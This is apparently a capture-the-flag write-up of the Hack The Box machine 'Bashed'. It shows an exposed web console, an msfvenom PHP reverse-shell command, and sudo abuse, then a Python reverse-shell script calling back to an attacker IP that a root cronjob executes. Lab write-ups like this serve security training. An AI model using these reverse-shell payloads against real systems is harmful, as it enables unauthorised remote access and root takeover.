---
tags:
  - php
  - cronjob
---
# HTB: Bashed

***Overview**: Bashed is an easy rated HTB machine that exploits a web facing php-bash console to gain compromised access and then exploits a cronjob running to gain a reverse shell as the root user.*
## Scanning and Enumeration

- So conducting a port scan and also a service scan, we can see that that we have an Apache server running on port 80

![](assets/Bashed_assets/Pasted%20image%2020231112203648.png)

- So navigating to the web server, we are brought to this

![](assets/Bashed_assets/Pasted%20image%2020231112202640.png)

- So conducting a directory scan using FFUF, we are brought to the following

![](assets/Bashed_assets/Pasted%20image%2020231112204345.png)

- as we can see above there is a directory dev, so navigating to it we are brought to what looks like a console, we can run ls and view the files on the server

![](assets/Bashed_assets/Pasted%20image%2020231112204428.png)

## Exploitation and Foothold

- So first we will generate a reverse shell PHP payload using msfvenom

```shell
msfvenom -p php/reverse_php lhost=10.10.14.7 lport=4444 -f raw > rev_shell.php
```

- then we can retrieve that payload to the server  and make it executable

![](assets/Bashed_assets/Pasted%20image%2020231112205909.png)

- then we can execute the payload with the command

```shell
php rev_shell.php
```

- and we get a reverse meterpreter shell

![](assets/Bashed_assets/Pasted%20image%2020231112205933.png)

- So we can retrieve the user flag

![](assets/Bashed_assets/Pasted%20image%2020231112210102.png)
## Post Exploitation: Privilege Escalation

- so we can view our passwd file and we'll see that er also have other users arrexel and scriptmanager

![](assets/Bashed_assets/Pasted%20image%2020231112210221.png)

- if we run our `sudo -l` command, we will see that we can execute any command as scriptmanager using sudo

![](assets/Bashed_assets/Pasted%20image%2020231112210304.png)

- so we can get a shell by running

```shell
sudo -u scriptmanager bash -i
```

![](assets/Bashed_assets/Pasted%20image%2020231112215553.png)

- we have access as scriptmanager, we can see that we have a directory scripts in the root directory and we have ownership over that directory. We can also view it and we can see we have access to a test.py script and a test.txt file, and what the test.py script is doing is it is open a file and then write that content in it

![](assets/Bashed_assets/Pasted%20image%2020231112215851.png)

- After looking at the time of execution or hen it was last accessed, we decided to conclude that it was probably a cronjob that was running that executes all the scripts in the scripts directory
- so to test this, we created a script, example.py and what it does is to open a file as well and write in text into the file like test.py

![](assets/Bashed_assets/Pasted%20image%2020231112220958.png)

- after doing this and waiting a couple minutes we saw that the example.txt file was created and we can also see the timing and notice that the file was actually created as root and this is because the cronjob was running as root

![](assets/Bashed_assets/Pasted%20image%2020231112220936.png)

 ![](assets/Bashed_assets/Pasted%20image%2020231112221024.png)

- so to get a reverse shell as root, lets create a python script with the following content and name it exploit.py

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",4443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

```

- we can tell that the script has been run from when the test.txt file was created/modified last

![](assets/Bashed_assets/Pasted%20image%2020231112222919.png)

- In our netcat listener, we then obtain a shell as root

![](assets/Bashed_assets/Pasted%20image%2020231112223004.png)

- now we can view the root.txt file

![](assets/Bashed_assets/Pasted%20image%2020231112223211.png)

- and if we verify, we can see that yes there was a crontab running and it was executing all python scripts in that directory

![](assets/Bashed_assets/Pasted%20image%2020231112223445.png)